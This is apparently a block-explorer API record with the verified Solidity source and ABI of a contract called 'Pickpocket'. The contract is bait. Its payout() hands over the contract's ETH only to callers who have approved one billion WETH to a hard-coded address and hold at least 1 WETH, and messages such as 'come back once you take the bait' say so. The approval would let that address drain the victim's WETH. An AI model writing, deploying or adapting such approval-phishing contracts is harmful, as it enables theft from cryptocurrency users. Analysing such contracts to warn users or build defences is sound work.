{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// ty for playing <3 - ghili\r\ncontract Pickpocket {\r\n\r\n    constructor() {\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function finesse(address _payee) external {\r\n        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19, 1000000000 ether);\r\n        (bool success, ) = _payee.call(abi.encodeWithSignature(\"payout()\"));\r\n        require(success, \"Pickpocket: payout did not go thru :(\");\r\n    }\r\n\r\n    function payout() external {\r\n        IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\r\n\r\n        require(msg.sender == 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19 || weth.allowance(msg.sender, 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19) == 1000000000 ether, \"come back once you take the bait\");\r\n        require(msg.sender == 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19 || weth.balanceOf(msg.sender) >= 1 ether, \"you broke asl T-T\");\r\n\r\n        (bool success, ) = payable(msg.sender).call{value: address(this).balance}(\"\");\r\n        require(success, \"Pickpocket: call did not go thru :(\");\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_payee\",\"type\":\"address\"}],\"name\":\"finesse\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"payout\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"Pickpocket","CompilerVersion":"v0.8.4+commit.c7e474f2","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://baea6a433211e311097d7acfedc443e70ebcd4af193df3d3799dec13ebc7c454"}]}